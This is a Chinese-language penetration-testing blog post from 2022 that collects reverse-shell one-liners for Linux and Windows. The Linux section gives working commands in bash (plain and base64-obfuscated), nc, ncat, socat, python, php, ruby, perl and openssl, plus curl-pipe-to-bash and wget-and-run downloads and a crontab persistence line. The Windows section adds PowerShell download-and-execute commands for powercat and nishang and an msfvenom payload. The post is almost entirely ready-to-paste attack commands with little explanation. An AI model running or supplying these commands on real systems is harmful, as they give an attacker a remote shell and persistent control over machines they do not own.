<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | 常规反弹shell合集</title><meta name="description" content="&lt;p&gt;反弹shell的常见方式&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">常规反弹shell合集</h3><div class="article__date metadata"><div class="post-info">2022/07/29</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="article__body"><p>反弹shell的常见方式</p>
<span id="more"></span>
<h1 id="反弹shell-linux"><a class="markdownIt-Anchor" href="#反弹shell-linux"></a> 反弹Shell-Linux</h1>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【监听端】centos: 192.168.35.152</span><br><span class="line">【被控端】kali: 192.168.35.128</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 监听端执行</span></span><br><span class="line">[root@localhost ~]<span class="comment"># nc -vvl 7777</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::7777</span><br><span class="line">Ncat: Listening on 0.0.0.0:7777</span><br></pre></td></tr></table></figure>
<h2 id="bash"><a class="markdownIt-Anchor" href="#bash"></a> bash</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1     # 执行失败                                   </span></span><br><span class="line">zsh: 没有那个文件或目录: /dev/tcp/<span class="number">192.168</span><span class="number">.35</span><span class="number">.152</span>/<span class="number">7777</span> </span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://0.tcp.ngrok.io:15122">0.tcp.ngrok.io:15122</a></p>
<p>bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15122 0&gt;&amp;1</p>
<h2 id="bash-base64"><a class="markdownIt-Anchor" href="#bash-base64"></a> bash base64</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="bash-base64-urlencode"><a class="markdownIt-Anchor" href="#bash-base64-urlencode"></a> bash base64 URLencode</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="nc"><a class="markdownIt-Anchor" href="#nc"></a> nc</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.35.152 7777</span><br><span class="line"><span class="built_in">mknod</span> backpipe p &amp;&amp; nc 192.168.35.152 7777 0&lt;backpipe | /bin/bash 1&gt;backpipe </span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.35.152 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<h2 id="ncat"><a class="markdownIt-Anchor" href="#ncat"></a> ncat</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat  192.168.35.152 7777 -e /bin/bash</span><br><span class="line">ncat --udp 192.168.35.152 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="curl"><a class="markdownIt-Anchor" href="#curl"></a> curl</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali开启http服务，把bash命令写入html文件</span></span><br><span class="line"><span class="built_in">cat</span> bash.html</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos</span></span><br><span class="line">curl 192.168.35.152/bash.html|bash</span><br></pre></td></tr></table></figure>
<h2 id="http"><a class="markdownIt-Anchor" href="#http"></a> http</h2>
<p>攻击方：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写shell脚本并启动http服务器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot;</span> &gt; shell.sh</span><br><span class="line">python2环境下：python -m SimpleHTTPServer 80</span><br><span class="line">python3环境下：python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>被控端：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传shell.sh文件</span></span><br><span class="line">wget 192.168.35.152/shell.sh</span><br><span class="line"><span class="comment"># 执行shell.sh文件</span></span><br><span class="line">bash shell.sh</span><br></pre></td></tr></table></figure>
<h2 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h2 id="whois"><a class="markdownIt-Anchor" href="#whois"></a> whois</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只能执行指定命令，如pwd命令</span></span><br><span class="line">whois -h 192.168.35.152 -p 7777 `<span class="built_in">pwd</span>` </span><br></pre></td></tr></table></figure>
<h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> python</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.35.152&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="php"><a class="markdownIt-Anchor" href="#php"></a> php</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="ruby"><a class="markdownIt-Anchor" href="#ruby"></a> ruby</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.35.152&quot;,7777).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span>  <span class="comment"># 执行失败</span></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.35.152&quot;,&quot;7777&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="socat"><a class="markdownIt-Anchor" href="#socat"></a> socat</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777</span><br></pre></td></tr></table></figure>
<h2 id="perl"><a class="markdownIt-Anchor" href="#perl"></a> perl</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.35.152&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="php-2"><a class="markdownIt-Anchor" href="#php-2"></a> php</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="openssl"><a class="markdownIt-Anchor" href="#openssl"></a> openssl</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听端</span></span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 7777</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">ncat --ssl -vv -l -p 7777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受控端</span></span><br><span class="line"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.35.152:7777 &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
<h1 id="反弹shell-windows"><a class="markdownIt-Anchor" href="#反弹shell-windows"></a> 反弹Shell-Windows</h1>
<ul>
<li>Windows下的反弹shell仅测试了nc，执行成功。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【监听端】centos: 192.168.35.152</span><br><span class="line">【被控端】windows: 192.168.35.1</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 监听端执行</span></span><br><span class="line">[root@localhost ~]<span class="comment"># nc -vvl 7777</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::7777</span><br><span class="line">Ncat: Listening on 0.0.0.0:7777</span><br></pre></td></tr></table></figure>
<h2 id="powercat"><a class="markdownIt-Anchor" href="#powercat"></a> powercat</h2>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.Net.Webclient.DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);powercat -c 192.168.35.152 -p 7777 -e cmd</span><br></pre></td></tr></table></figure>
<h2 id="nc-2"><a class="markdownIt-Anchor" href="#nc-2"></a> nc</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.35.152 7777 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
<h2 id="nishang"><a class="markdownIt-Anchor" href="#nishang"></a> nishang</h2>
<p>Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令</span></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777</span><br></pre></td></tr></table></figure>
<h2 id="reverse-udp-shell"><a class="markdownIt-Anchor" href="#reverse-udp-shell"></a> Reverse UDP shell</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777</span><br></pre></td></tr></table></figure>
<h2 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找出各类反弹一句话payload的路径信息</span></span><br><span class="line">msfvenom -l payloads | grep <span class="string">&#x27;cmd/windows/reverse&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成反弹shell，复制粘贴到靶机上运行</span></span><br><span class="line">msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777</span><br></pre></td></tr></table></figure>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2022/08/14/cypherpunk/">prev_post</a><a class="pagination__link pagination__next" href="/2022/06/10/windbg-note/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>